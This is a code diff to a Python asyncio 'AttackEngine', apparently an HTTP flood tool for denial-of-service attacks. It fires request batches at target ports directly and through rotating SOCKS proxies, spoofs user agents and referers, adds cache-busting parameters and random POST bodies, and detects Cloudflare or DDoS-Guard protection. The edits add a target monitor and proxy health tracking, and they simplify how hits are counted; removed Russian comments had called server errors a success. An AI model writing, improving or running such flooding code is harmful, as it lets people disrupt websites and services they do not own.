@@ -2,7 +2,7 @@ import asyncio
 import random
 import string
 import time
-from typing import Dict, List, Optional
+from typing import List, Optional
 from urllib.parse import urlparse
 
 import aiohttp
@@ -10,6 +10,7 @@ from aiohttp_socks import ProxyConnector
 
 from models import AttackMethod, AttackStats, AttackStatus, PortStats, PortStatus
 from proxy_pool import proxy_pool
+from target_monitor import monitor
 from config import settings
 
 
@@ -18,38 +19,30 @@ UA = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
 ]
 
-REF = [
-    "https://www.google.com/search?q=", "https://www.bing.com/search?q=",
-    "https://duckduckgo.com/?q=", "https://yandex.ru/search/?text=",
-    "https://www.reddit.com/", "https://github.com/",
-]
+REF = ["https://google.com/search?q=", "https://bing.com/search?q=", "https://duckduckgo.com/?q=",
+       "https://yandex.ru/search/?text=", "https://reddit.com/", "https://github.com/"]
 
-_chars = string.ascii_letters + string.digits
+_c = string.ascii_letters + string.digits
 
 
-def _junk(lo=3, hi=12):
-    return "".join(random.choices(_chars, k=random.randint(lo, hi)))
+def _j(lo=3, hi=12):
+    return "".join(random.choices(_c, k=random.randint(lo, hi)))
 
 
 def _h():
-    return {
-        "User-Agent": random.choice(UA),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Referer": random.choice(REF) + _junk(5, 15),
-        "Cache-Control": "no-cache",
-        "Connection": "keep-alive",
-    }
+    return {"User-Agent": random.choice(UA), "Accept": "text/html,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate, br", "Referer": random.choice(REF) + _j(5, 15),
+            "Cache-Control": "no-cache", "Connection": "keep-alive"}
 
 
 def _p():
-    return {_junk(5, 10): _junk(100, 500) for _ in range(random.randint(1, 3))}
+    return {_j(5, 10): _j(100, 500) for _ in range(random.randint(1, 3))}
 
 
 def _m(m):
@@ -68,8 +61,7 @@ def _url(target, port):
 
 
 def _bust(base):
-    sep = "&" if "?" in base else "?"
-    return f"{base}{sep}{_junk(3,6)}={_junk(8,16)}"
+    return f"{base}{'&' if '?' in base else '?'}{_j(3,6)}={_j(8,16)}"
 
 
 class AttackEngine:
@@ -95,6 +87,12 @@ class AttackEngine:
             threads=threads, started_at=time.time(),
             proxies_loaded=proxy_pool.count if use_proxies else 0,
         )
+
+        # Start target monitor
+        parsed = urlparse(target)
+        host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
+        monitor.start(host, ports[0])
+
         self._task = asyncio.create_task(self._run(target, ports, method, threads, duration, use_proxies))
 
     async def stop(self):
@@ -102,6 +100,7 @@ class AttackEngine:
             return
         self.stats.status = AttackStatus.STOPPING
         self._stop.set()
+        monitor.stop_sync()
         if self._task:
             try:
                 await asyncio.wait_for(self._task, timeout=5.0)
@@ -111,7 +110,10 @@ class AttackEngine:
 
     async def _run(self, target, ports, method, threads, duration, use_proxies):
         deadline = time.time() + duration if duration > 0 else 0
-        tpp = max(threads // len(ports), 50)
+
+        # Distribute threads: more to ports with better response
+        alive_ports = [p for p in ports if self.stats.ports[p].status == PortStatus.ALIVE]
+        tpp = max(threads // max(len(alive_ports), 1), 50)
 
         tasks = [asyncio.create_task(self._port_worker(target, p, method, tpp, deadline, use_proxies)) for p in ports]
         tasks.append(asyncio.create_task(self._health_loop(target)))
@@ -128,11 +130,11 @@ class AttackEngine:
     async def _port_worker(self, target, port, method, threads, deadline, use_proxies):
         base = _url(target, port)
         sem = asyncio.Semaphore(threads)
-        direct_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
-        proxy_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)
+        d_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
+        p_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)
 
-        direct_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
-        direct_session = aiohttp.ClientSession(connector=direct_conn, timeout=direct_timeout)
+        d_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
+        d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)
 
         try:
             while not self._stop.is_set():
@@ -145,17 +147,17 @@ class AttackEngine:
 
                 batch = []
                 for _ in range(threads):
-                    if use_proxies and proxy_pool.count > 0 and random.random() > 0.3:
-                        batch.append(self._fire_proxy(base, port, method, sem, proxy_timeout))
+                    if use_proxies and proxy_pool.alive_count > 0 and random.random() > 0.3:
+                        batch.append(self._fire_proxy(base, port, method, sem, p_timeout))
                     else:
-                        batch.append(self._fire_direct(direct_session, base, port, method, sem))
+                        batch.append(self._fire_direct(d_session, base, port, method, sem))
                 await asyncio.gather(*batch, return_exceptions=True)
         except asyncio.CancelledError:
             pass
         except Exception as e:
             self.last_error = f"Port {port}: {e}"
         finally:
-            await direct_session.close()
+            await d_session.close()
 
     async def _fire_direct(self, session, base, port, method, sem):
         async with sem:
@@ -165,9 +167,8 @@ class AttackEngine:
             if not ps or ps.status != PortStatus.ALIVE:
                 return
 
-            url = _bust(base)
             m = _m(method)
-            kw = {"method": m, "url": url, "headers": _h(), "ssl": False}
+            kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
             if m == "POST":
                 kw["json"] = _p()
 
@@ -191,9 +192,8 @@ class AttackEngine:
             if not px:
                 return
 
-            url = _bust(base)
             m = _m(method)
-            kw = {"method": m, "url": url, "headers": _h(), "ssl": False}
+            kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
             if m == "POST":
                 kw["json"] = _p()
 
@@ -202,36 +202,20 @@ class AttackEngine:
                 async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                     async with s.request(**kw) as resp:
                         self._hit(ps, resp.status, resp.headers, False)
+                        proxy_pool.mark_alive(px)
             except Exception:
                 self._miss(ps, False)
+                proxy_pool.mark_dead(px)
 
     def _hit(self, ps, status, headers, is_direct):
         ps.total_requests += 1
         ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
         ps.last_response_time = time.time()
         self.stats.total_requests += 1
-
-        # Любой HTTP ответ = сервер обработал запрос = нагрузка на него
-        if status == 429:
-            ps.successful += 1
-            self.stats.successful += 1
-        elif status >= 500:
-            # Сервер корёжит — это успех
-            ps.successful += 1
-            self.stats.successful += 1
-            if is_direct:
-                ps.consecutive_fails = 0
-        elif status in (301, 302, 303, 307, 308, 200, 201, 204, 400, 401, 403, 404, 405, 408):
-            # Сервер ответил — значит он обрабатывает, значит нагрузка идёт
-            ps.successful += 1
-            self.stats.successful += 1
-            if is_direct:
-                ps.consecutive_fails = 0
-        else:
-            ps.successful += 1
-            self.stats.successful += 1
-            if is_direct:
-                ps.consecutive_fails = 0
+        ps.successful += 1
+        self.stats.successful += 1
+        if is_direct:
+            ps.consecutive_fails = 0
 
         srv = (headers.get("server") or "").lower()
         if "cloudflare" in srv or "ddos-guard" in srv:
